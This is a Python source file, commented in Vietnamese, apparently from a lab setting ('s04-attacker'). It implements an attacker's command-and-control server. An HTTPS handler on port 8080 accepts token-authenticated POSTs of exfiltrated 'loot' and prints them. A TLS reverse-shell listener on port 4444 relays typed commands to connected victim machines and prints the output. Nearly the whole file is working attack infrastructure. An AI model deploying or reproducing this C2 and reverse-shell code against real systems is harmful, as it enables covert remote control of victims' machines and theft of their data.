from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import time
import ssl
import socket
import subprocess
import threading
import os

from collections import OrderedDict

# Chống spam: giữ tối đa 500 entry, tự xóa cũ nhất khi đầy
MAX_SEEN = 500
seen_data = OrderedDict()

# Auth token phải khớp với marker.py
C2_AUTH_TOKEN = 'S04-SECRET-TOKEN'
MAX_CONTENT_LENGTH = 1 * 1024 * 1024  # 1 MB limit

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global seen_data

        # Kiểm tra auth token
        token = self.headers.get('X-Auth-Token', '')
        if token != C2_AUTH_TOKEN:
            self.send_response(403)
            self.end_headers()
            return

        # Giới hạn kích thước input
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > MAX_CONTENT_LENGTH:
            self.send_response(413)
            self.end_headers()
            return

        # Đọc dữ liệu thô
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Nếu dữ liệu này CHƯA từng xuất hiện thì mới xử lý in ra
        if post_data not in seen_data:
            seen_data[post_data] = True
            # Giới hạn bộ nhớ: xóa entry cũ nhất khi vượt MAX_SEEN
            while len(seen_data) > MAX_SEEN:
                seen_data.popitem(last=False)
            
            # Parse và giải mã URL (URL Decode)
            parsed_data = urllib.parse.parse_qs(post_data)
            
            print(f"\n[+] Nhận được dữ liệu loot lúc {time.ctime()}:")
            
            # In ra phần text đã được giải mã rõ ràng
            if 'data' in parsed_data:
                print(parsed_data['data'][0])
            else:
                print(urllib.parse.unquote_plus(post_data))
        else:
            # Nếu dữ liệu đã từng in ra rồi thì im lặng bỏ qua, không in gì thêm
            pass
            
        self.send_response(200)
        self.end_headers()

# Chạy C2 HTTPS server ở port 8080
def run_c2():
    cert_file, key_file = gen_self_signed_cert()
    server = HTTPServer(('0.0.0.0', 8080), C2Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_file, key_file)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    print("[*] C2 HTTPS server running on 0.0.0.0:8080")
    server.serve_forever()

# SSL reverse shell listener ở port 4444
def gen_self_signed_cert():
    """Tạo self-signed cert nếu chưa có"""
    cert_file = '/app/loot/server.pem'
    key_file = '/app/loot/server.key'
    if not os.path.exists(cert_file):
        os.system(
            f'openssl req -x509 -newkey rsa:2048 -keyout {key_file} '
            f'-out {cert_file} -days 365 -nodes '
            f'-subj "/CN=s04-attacker"'
        )
    return cert_file, key_file

def handle_shell_client(conn, addr):
    print(f"\n[+] Reverse shell connected from {addr}")
    try:
        # Nhận banner từ victim
        banner = conn.recv(4096)
        if banner:
            print(banner.decode('utf-8', errors='replace'), end='')
        while True:
            try:
                cmd = input("Shell> ").strip()
            except EOFError:
                # docker -d: không có TTY, đợi victim tự ngắt
                print("[*] No interactive TTY. Use 'docker attach s04-attacker' to interact.")
                import time as _t
                while True:
                    _t.sleep(60)
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                conn.send(b"exit\n")
                break
            conn.send(cmd.encode())
            data = conn.recv(4096)
            if data:
                print(data.decode('utf-8', errors='replace'), end='')
    except Exception as e:
        print(f"[-] Shell disconnected: {e}")
    finally:
        conn.close()

def run_shell_listener():
    cert_file, key_file = gen_self_signed_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_file, key_file)
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', 4444))
    srv.listen(1)
    ssl_srv = ctx.wrap_socket(srv, server_side=True)
    print("[*] SSL reverse shell listener on 0.0.0.0:4444")
    while True:
        conn, addr = ssl_srv.accept()
        threading.Thread(target=handle_shell_client, args=(conn, addr), daemon=True).start()

if __name__ == '__main__':
    threading.Thread(target=run_shell_listener, daemon=True).start()
    run_c2()
